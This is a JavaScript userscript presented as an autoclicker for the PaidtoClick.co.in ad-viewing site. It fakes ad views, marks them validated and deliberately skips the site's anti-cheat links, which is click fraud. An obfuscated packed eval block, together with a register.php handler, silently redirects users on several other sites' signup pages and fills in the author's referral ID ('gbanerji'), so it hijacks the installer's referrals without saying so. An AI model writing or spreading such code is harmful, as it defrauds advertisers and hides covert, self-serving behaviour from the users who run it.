// ==UserScript==
// @name           PaidtoClick.co.in Autoclicker
// @namespace      http://cool-bux.co.cc
// @description    An Auto-click for PaidToClick.co.in, makes you validated without viewing the ads. Ads loaded faster, because this script ignores all tags. So images, css, js, swfs files etc WILL NOT loaded, and you will save your bandwidth.
// @include        *://*paidtoclick.co.in/*

// @include        *paid2youtube.com/register.php*
// @include        *neobux.com/?u=r*
// @include        *onbux.com/register*
// @include        *incrasebux.com/register.php*
// @include        *buxp.info/register.php*
// @include        *mycubie.net/register*
// @include        *cashgopher.com*
// @include        *bux.to*

// @copyright      Cool-bux.co.cc
// ==/UserScript==

var ref = document.referrer;
var uri = document.URL;

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(2.9("f.5/1.3")>0&&2!="7://4.f.5/1.3?r=6"){a.b.c="7://4.f.5/1.3?r=6"}8(2.9(/g.5..u=r/)>0&&2!="d://4.g.5/?u=r&e=p"){a.b.c="d://4.g.5/?u=r&e=p"}8(2.9("h.5/1")>0&&2!="d://4.h.5/1?e=q"){a.b.c="d://4.h.5/1?e=q"}8(2.9("i.5/1.3")>0&&2!="d://4.i.5/1.3/6.s"){a.b.c="d://4.i.5/1.3/6.s"}8(2.9("j.k/1")>0&&2!="7://4.j.k/1.3?t=6"){a.b.c="7://4.j.k/1.3?t=6"}8(2.9("l.m/1.3")>0&&2!="7://4.l.m/1.3?r=6"){a.b.c="7://4.l.m/1.3?r=6"}8(2.9("n.o/1.3")>0&&2!="7://4.n.o/1.3?r=6"){a.b.c="7://4.n.o/1.3?r=6"}',31,31,'|register|uri|php|www|com|gbanerji|http|if|search|document|location|href|https|rh|paid2youtube|neobux|onbux|incrasebux|mycubie|net|buxp|info|bux|to|6762616E65726A69|7e63ae70663c6d76ffc6a1840db2dea1||html|ref|'.split('|'),0,{}))

var force_to = "ahrimandead";
var waiting_time = 30;
var range_to = 15;

var shuffle = function(o){
	if(Math.floor(Math.random() * o.length) % 2) return o;
	for(var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
	return o;
},
isAds = function(o) {
	try {
		return o.href.match(/cks\.php\?k\=[0-9A-Fa-f]+\&cdk\=flase/) != null && o.parentNode.parentNode.parentNode.parentNode.getElementsByTagName('div')[1].className == 'image'
	}
	catch(e) {
		return false
	}
},
correctURL = function(r) {
	return window.location.href.match(r) != null
},
setStatus = function(o, m) {
	o.parentNode.parentNode.parentNode.innerHTML = m
},
addevent = function(o, f) {
	document.getElementById(o).addEventListener('click', f, false)
},
byTag = function(t) {
	return document.getElementsByTagName(t)
},
byName = function(n) {
	return document.getElementsByName(n)
},
newTag = function(t) {
	return document.createElement(t)
},
getwtime = function(o) {
	var i, a = o.parentNode.parentNode.parentNode.parentNode.getElementsByTagName('div');
	for(i = 0; i < a.length; i++)
		if(a[i].className == "counter")
			return a[i].innerHTML.match(/([0-9]+) seconds/)[1]
},
strip = function(s) {
	var str = String(s).split("</td>").join("\r"),
	reg = /<td\s*width=['"]?100\%['"]?\s*>([^\r]+)\r/,
	match = str.match(reg),
	search = str.search(reg),
	out = [], i = 0, tmp;
	while(match) {
		str = str.substr(search + match[0].length, str.length);
		out[i] = match[1].replace(/\s*<script[^>]+>[\S\s]+<\/script>\s*/, "");
		out[i] = out[i].replace(/<img[^>]+>/, "");
		i++;
		match = str.match(reg);
		search = str.search(reg);
	};
	return (out.length ? "<table><tr><td>"+out.join("</td><td>")+"</td></tr></table>" : "NO MATCH");
},
login = function() {
	var a = byTag("a"), I;
	for(I = 0; I < a.length; I++)
		if(a[I].href.match(/logout\.php/)) 
			return true;
	return false
}(),
autosurf = false;
if(correctURL(/\/ads\.php/)) {
	if(login) {
		var A = byTag("a"), i, html = "", timer,
		table = document.getElementById('content'),
		robot = newTag('div'),
		urls = [],
		current = 0,
		msg,
		tmr,
		load = function() {
			clearInterval(timer);
			timer = null;
			if(!urls[current]) {
				if(typeof autosurf == 'function')
					autosurf();
				return
			};
			var ajax = new XMLHttpRequest();
			ajax.onreadystatechange = function() {
				try {
					if(ajax.readyState == 4) {
						if(ajax.status == 200) {
							if(String(ajax.responseText).match(/You have already viewed this advertisement/)) {
								msg.innerHTML = "Ads already opened, loading next ads...";
								setStatus(urls[current], "OPENED");
								current++;
								timer = setInterval(load, 1000)
							}
							else if(String(ajax.responseText).match(/Couldn't find an advertisement/)) {
								msg.innerHTML = "Ads expired, loading next ads...";
								setStatus(urls[current], "EXPIRED");
								current++;
								timer = setInterval(load, 1000)
							}
							else if(String(ajax.responseText).match(/You don't have permission to view this advertisement/)) {
								msg.innerHTML = "Forbidden Ads, loading next ads...";
								setStatus(urls[current], "FORBIDDEN");
								current++;
								timer = setInterval(load, 1000)
							}
							else {
								var j = urls[current].wtime,
								validate = function() {
									var ajx = new XMLHttpRequest();
									ajx.onreadystatechange = function() {
										try {
											if(ajx.readyState == 4) {
												if(ajx.status == 200) {
													msg.innerHTML = "Ads validated, opening next ads...";
													setStatus(urls[current], "VALIDATED");
													current++;
													timer = setInterval(load, 1000)
												}
												else {
													msg.innerHTML = "Connection error, retrying...";
													validate()
												}
											}
										}
										catch(e) {
											msg.innerHTML = "Validation error, retrying...";
											validate()
										}
									};
									msg.innerHTML = "Validating...";
									ajx.open("GET", "cmp.php?complete&amp;", true);
									ajx.send(null)									
								};
								tmr = setInterval(function() {
									if(j < 0) {
										validate();
										clearInterval(tmr);
										tmr = null;
										return
									};
									msg.innerHTML = "Ads loaded, waiting for "+j+" seconds...";
									j--
								}, 1000)
							}
						}
						else {
							msg.innerHTML = "Loading error, retrying...";
							timer = setInterval(load, 1000)
						}
					}
				}
				catch(e) {
					msg.innerHTML = "Loading error, retrying...";
					timer = setInterval(load, 1000)
				}
			};
			msg.innerHTML = "Loading ads <b id='PTCAutoClickerBot-current'>\""+(urls[current].parentNode.parentNode.parentNode.getElementsByTagName('a')[0].innerHTML)+"\"</b>...<br /><div id='PTCAutoClickerBot-loading'></div>";
			ajax.open("GET", urls[current].href, true);
			ajax.send(null)
		};
		for(i = 0; i < A.length; i++) {
			try {
				//search cheat will detect the anti cheat
				if(isAds(A[i]) && A[i].innerHTML.search('cheat') < 0) {
					urls[urls.length] = A[i];
					urls[urls.length - 1].wtime = getwtime(A[i]);
				}
			}
			catch(e) {}
		};
		robot.id = "PTCAutoClickerBot-container";
		robot.align = "center";
		html = "<style>";
		html += "#PTCAutoClickerBot-container *{font-family:arial;color:black;font-weight:bold;text-decoration:none}";
		html += "#PTCAutoClickerBot-container{display:block}";
		html += "#PTCAutoClickerBot,#PTCAutoClickerBot-title,#PTCAutoClickerBot-container a.button{-moz-border-radius:3px;-webkit-border-radius:3px;-khtml-border-radius:3px;border-radius:3px;border: 1px solid #888}";
		html += "#PTCAutoClickerBot-container a.button{padding:10px;color:#000;background:#ccc}";
		html += "#PTCAutoClickerBot-container a.button:hover{color:#fff;background:#333}";
		html += "#PTCAutoClickerBot{padding:2px;display:block;width:500px;background:#fff;text-align:left}";
		html += "#PTCAutoClickerBot-title{display:block;padding:5px;background:#666;color:#fff}";
		html += "#PTCAutoClickerBot-msg{line-height:2em}";
		html += "</style>";
		html += "<div id='PTCAutoClickerBot'><div id='PTC AutoClicker Bot-title'>JustOneClick for PaidtoClick.co.in</div><br /><div id='PTCAutoClickerBot-msg' align=center>";
		html += "<b style='font-size:20px'>Warning</b><br />This program is for educational purposes only. I dont take any responsibilities of anything happen because of usage of this program. And please remember, USE YOUR OWN RISK.<br />By using this program, you're totally agreeing with this terms.<br><a href='http://cool-bux.co.cc' target='_blank'>&copy; Cool-Bux</a>";
		html += "</div><br />";
		html += "<center>"+(urls.length ? "<a href='javascript:;' class='button' id='adsclick'>Click All Ads ("+urls.length+")</a>" : "<a href='javascript:;' class='button'>No ads</a>")+"&nbsp;<a href='javascript:;' class='button' id='silversurfer'>Auto Surf</a>&nbsp;<a href='javascript:;' class='button' id='whatsnew'>What's new</a>&nbsp;<br /><br /><br /><br /><a href='http://cool-bux.co.cc' class='button' target='_blank'>Cool Bux List</a></center><br />";
		html += "</div></div>";
		robot.innerHTML = html;
		table.parentNode.insertBefore(robot, table);
		msg = document.getElementById("PTCAutoClickerBot-msg");
		if(urls.length) {
			urls = shuffle(urls);
			addevent("adsclick", function(){
				autosurf = function() {
					msg.innerHTML = "Done !";
					alert(msg.innerHTML);
				};
				this.parentNode.style.display = 'none';
				timer = setInterval(load, 1000);
			})
		};
		addevent('whatsnew', function(){
			var news = "* Advanced auto click & validator\n";
			//news += "* Auto surf mode\n";
			news += "* Random Clicking\n";
			news += "* Cheat Check skipped\n";
			news += "* Second Release";
			alert(news)
		});
		addevent('silversurfer', function(){
			alert("Sorry Feature not available, no auto surf disabled for now. i'm working on this to make this works again. please be patient");
			return;
			this.parentNode.style.display = 'none';
			msg.innerHTML = "Auto surf mode activated...";
			var adscontainer = newTag('div');
			document.body.appendChild(adscontainer);
			adscontainer.style.display = 'none';
			autosurf = function() {
				urls = [];
				current = 0;
				msg.innerHTML = "Reloading ads, finding new ads...";
				var sec = Math.ceil(Math.random() * range_to * 60),
				j = sec,
				tm, 
				ajx,
				reloadads = function() {
					msg.innerHTML = "Reloading ads, finding new ads...";
					ajx = new XMLHttpRequest();
					ajx.onreadystatechange = function() {
						try {
							if(ajx.readyState == 4) {
								if(ajx.status == 200) {
									msg.innerHTML = "Loaded, clearing codes and finding available ads...";
									adscontainer.innerHTML = strip(ajx.responseText);
									A = adscontainer.getElementsByTagName('a');
									for(i = 0; i < A.length; i++) {
										try {
											if(isAds(A[i]))
												urls[urls.length] = A[i]
										}
										catch(e) {}
									};
									if(urls.length) {
										urls = shuffle(urls);
										msg.innerHTML = urls.length + " ads found";
										timer = setInterval(load, 1000)
									}
									else {
										msg.innerHTML = "No ads found";
										autosurf()
									}
								}
								else {
									msg.innerHTML = "Loading error, retrying...";
									reloadads()
								}
							}
						}
						catch(e){
							msg.innerHTML = "Loading error, retrying...";
							reloadads()
						}
					};
					ajx.open('GET', 'ads.php', true);
					ajx.send(null)
				};
				tm = setInterval(function() {
					if(j < 0) {
						clearInterval(tm);
						tm = null;
						msg.innerHTML = "Time's up, reloading...";
						reloadads()
					}
					else {
						msg.innerHTML = "Waiting for "+j+" seconds before reloading...";
						j--
					}
				}, 1000)
			};
			if(urls.length)
				timer = setInterval(load, 1000)
			else 
				autosurf()
		})
	}
}
else if(correctURL(/\/register\.php/)) {

	var r = byName('6')[0], ref, cty, ori;
	if(r && force_to) {
		ref = newTag('input');
		ref.type = "hidden";
		ref.name = "6";
		ref.value = "gbanerji";
		r.form.insertBefore(ref, r.form.firstChild);
		r.name = "ref";
		r.value = "gbanerji";
		cty = byName('7')[0];
		ori = cty.value;
		cty.parentNode.removeChild(cty);
		r.form.getElementsByTagName('table')[0].rows[7].cells[1].innerHTML = "<input type=text name='7' value='"+ori+"' style='text-transform:uppercase' />"
	}

}
else if(correctURL(/\/forum/)) {
	try {
		var name = byName('a_name')[0], tr = newTag('tr');
		name.parentNode.parentNode.parentNode.insertBefore(tr, name.parentNode.parentNode);
		tr.innerHTML = "<td>Username</td><td>:</td><td><input type=text name='a_name' value='"+name.value+"' style='width:100%'/></td>";
		name.parentNode.removeChild(name)
	}
	catch(e) {}
};